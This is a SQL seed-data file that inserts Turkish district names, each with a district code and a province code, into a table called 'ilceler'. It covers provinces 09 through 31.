INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '120', '09', 'Sultanhisar' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '121', '09', 'Yenihisar' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '122', '09', 'Yenipazar' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '123', '10', 'bolum' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '124', '10', 'Ayvalik' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '125', '10', 'Akçay' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '126', '10', 'Balya' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '127', '10', 'Bandirma' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '128', '10', 'Bigadiç' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '129', '10', 'Burhaniye' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '130', '10', 'Dursunbey' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '131', '10', 'Edremit' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '132', '10', 'Erdek' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '133', '10', 'Gönen' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '134', '10', 'Gömeç' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '135', '10', 'Havran' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '136', '10', 'Ivrindi' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '137', '10', 'Kepsut' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '138', '10', 'Manyas' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '139', '10', 'Marmara' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '140', '10', 'Savastepe' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '141', '10', 'Sindirgi' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '142', '10', 'Susurluk' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '143', '11', 'bolum' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '144', '11', 'Bozöyük' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '145', '11', 'Gölpazari' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '146', '11', 'Inhisar' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '147', '11', 'Osmaneli' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '148', '11', 'Pazaryeri' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '149', '11', 'Sögüt' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '150', '11', 'Yenipazar' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '151', '12', 'bolum' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '152', '12', 'Adakli' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '153', '12', 'Genç' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '154', '12', 'Karliova' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '155', '12', 'Kigi' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '156', '12', 'Solhan' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '157', '12', 'Yayladere' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '158', '12', 'Yedisu' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '159', '13', 'bolum' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '160', '13', 'Adilcevaz' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '161', '13', 'Ahlat' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '162', '13', 'Güroymak' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '163', '13', 'Hizan' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '164', '13', 'Mutki' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '165', '13', 'Tatvan' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '166', '14', 'bolum' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '167', '14', 'Dörtdivan' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '168', '14', 'Gerede' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '169', '14', 'Göynük' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '170', '14', 'Kibriscik' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '171', '14', 'Mengen' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '172', '14', 'Mudurnu' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '173', '14', 'Seben' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '174', '14', 'Yeniçaga' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '175', '15', 'bolum' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '176', '15', 'Altinyayla' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '177', '15', 'Aglasun' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '178', '15', 'Bucak' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '179', '15', 'Çavdir' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '180', '15', 'Çeltikçi' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '181', '15', 'Gölhisar' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '182', '15', 'Karamanli' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '183', '15', 'Kemer' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '184', '15', 'Tefenni' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '185', '15', 'Yesilova' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '186', '16', 'bolum' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '187', '16', 'Büyükorhan' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '188', '16', 'Gemlik' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '189', '16', 'Gürsu' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '190', '16', 'Harmancik' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '191', '16', 'Inegöl' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '192', '16', 'Iznik' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '193', '16', 'Karacabey' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '194', '16', 'Keles' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '195', '16', 'Kestel' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '196', '16', 'Mudanya' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '197', '16', 'Mustafakema' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '198', '16', 'Nilüfer' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '199', '16', 'Orhaneli' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '200', '16', 'Orhangazi' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '201', '16', 'Osmangazi' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '202', '16', 'Yenisehir' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '203', '16', 'Yildirim' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '204', '17', 'bolum' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '205', '17', 'Ayvacik' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '206', '17', 'Bayramiç' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '207', '17', 'Bozcaada' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '208', '17', 'Biga' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '209', '17', 'Çan' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '210', '17', 'Eceabat' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '211', '17', 'Ezine' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '212', '17', 'Gelibolu' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '213', '17', 'Gökçeada' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '214', '17', 'Lapseki' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '215', '17', 'Yenice' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '216', '18', 'bolum' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '217', '18', 'Atkaracalar' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '218', '18', 'Bayramören' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '219', '18', 'Çerkes' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '220', '18', 'Eldivan' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '221', '18', 'Ilgaz' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '222', '18', 'Kizilirmak' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '223', '18', 'Korgun' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '224', '18', 'dersunlu' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '225', '18', 'Orta' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '226', '18', 'Ovacik' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '227', '18', 'Sabanözü' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '228', '18', 'Yaprakli' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '229', '19', 'bolum' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '230', '19', 'Alaca' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '231', '19', 'Bayat' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '232', '19', 'Bogazkale' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '233', '19', 'Dodurga' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '234', '19', 'Iskilip' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '235', '19', 'Kargi' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '236', '19', 'Laçin' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '237', '19', 'Mecitözü' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '238', '19', 'Oguzlar' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '239', '19', 'Ortaköy' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '240', '19', 'Osmancik' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '241', '19', 'Sungurlu' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '242', '19', 'Ugurludag' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '243', '20', 'bolum' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '244', '20', 'Acipayam' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '245', '20', 'Akköy' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '246', '20', 'Babadag' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '247', '20', 'Baklan' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '248', '20', 'Bekilli' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '249', '20', 'Beyagaç' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '250', '20', 'Buldan' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '251', '20', 'Bozkurt' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '252', '20', 'Çal' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '253', '20', 'Çameli' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '254', '20', 'Çardak' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '255', '20', 'Çivril' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '256', '20', 'Güney' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '257', '20', 'Honaz' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '258', '20', 'Kale' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '259', '20', 'Sarayköy' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '260', '20', 'Serinhisar' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '261', '20', 'Tavas' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '262', '21', 'bolum' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '263', '21', 'Bismil' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '264', '21', 'Çermik' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '265', '21', 'Çinar' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '266', '21', 'Çüngüs' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '267', '21', 'Dicle' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '268', '21', 'Egil' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '269', '21', 'Ergani' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '270', '21', 'Hani' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '271', '21', 'Hazro' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '272', '21', 'Kocaköy' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '273', '21', 'Kulp' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '274', '21', 'Lice' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '275', '21', 'Silvan' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '276', '22', 'bolum' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '277', '22', 'Enez' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '278', '22', 'Havsa' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '279', '22', 'Ipsala' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '280', '22', 'Kesan' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '281', '22', 'Lalapasa' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '282', '22', 'Meriç' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '283', '22', 'Süloglu' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '284', '22', 'Uzunköprü' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '285', '23', 'bolum' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '286', '23', 'Agin' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '287', '23', 'Alacakaya' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '288', '23', 'Aricak' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '289', '23', 'Baskil' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '290', '23', 'Karakoçan' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '291', '23', 'Keban' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '292', '23', 'Kovancilar' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '293', '23', 'Maden' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '294', '23', 'Palu' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '295', '23', 'Sivrice' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '296', '24', 'bolum' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '297', '24', 'Çayirli' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '298', '24', 'Iliç' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '299', '24', 'Kemah' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '300', '24', 'Kemaliye' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '301', '24', 'Otlukbeli' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '302', '24', 'Refahiye' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '303', '24', 'Tercan' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '304', '24', 'Üzümlü' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '305', '25', 'bolum' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '306', '25', 'Askale' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '307', '25', 'Çat' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '308', '25', 'Hinis' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '309', '25', 'Horasan' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '310', '25', 'Ilica' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '311', '25', 'Ispir' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '312', '25', 'Karaçoban' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '313', '25', 'Karayazi' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '314', '25', 'Köprüköy' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '315', '25', 'Narman' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '316', '25', 'Oltu' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '317', '25', 'Olur' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '318', '25', 'Pasinler' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '319', '25', 'Pazaryolu' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '320', '25', 'Senkaya' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '321', '25', 'Tekman' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '322', '25', 'Tortum' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '323', '25', 'Uzundere' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '324', '26', 'bolum' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '325', '26', 'Alpu' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '326', '26', 'Beylikova' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '327', '26', 'Çifteler' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '328', '26', 'Günyüzü' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '329', '26', 'Han' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '330', '26', 'Inönü' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '331', '26', 'Mahmudiye' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '332', '26', 'Mihalgazi' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '333', '26', 'Mihaliççik' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '334', '26', 'Saricakaya' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '335', '26', 'Seyitgazi' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '336', '26', 'Sivrihisar' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '337', '27', 'bolum' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '338', '27', 'Araban' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '339', '27', 'Islahiye' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '340', '27', 'Kilis' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '341', '27', 'Kargamis' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '342', '27', 'Nizip' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '343', '27', 'Nurdagi' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '344', '27', 'Oguzeli' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '345', '27', 'Sahinbey' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '346', '27', 'Sehitkamil' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '347', '27', 'Yavuzeli' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '348', '28', 'bolum' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '349', '28', 'Alucra' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '350', '28', 'Bulancak' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '351', '28', 'Çamoluk' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '352', '28', 'Çanakçi' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '353', '28', 'Dereli' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '354', '28', 'Dogankent' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '355', '28', 'Espiye' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '356', '28', 'Eynesil' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '357', '28', 'Görele' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '358', '28', 'Güce' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '359', '28', 'Kesap' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '360', '28', 'Piraziz' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '361', '28', 'Sebinkarahisar' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '362', '28', 'Tirebolu' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '363', '28', 'Yaglidere' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '364', '29', 'bolum' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '365', '29', 'Kelkit' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '366', '29', 'Köse' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '367', '29', 'Kürtün' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '368', '29', 'Siran' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '369', '29', 'Torul' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '370', '30', 'bolum' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '371', '30', 'Çukurca' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '372', '30', 'Semdinli' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '373', '30', 'Yüksekova' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '374', '31', 'bolum' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '375', '31', 'Altinözü' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '376', '31', 'Belen' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '377', '31', 'Dörtyol' );
INSERT INTO `ilceler`(`ilceKodu`,`il`,`ilceAdi`) VALUES ( '378', '31', 'Erzin' );
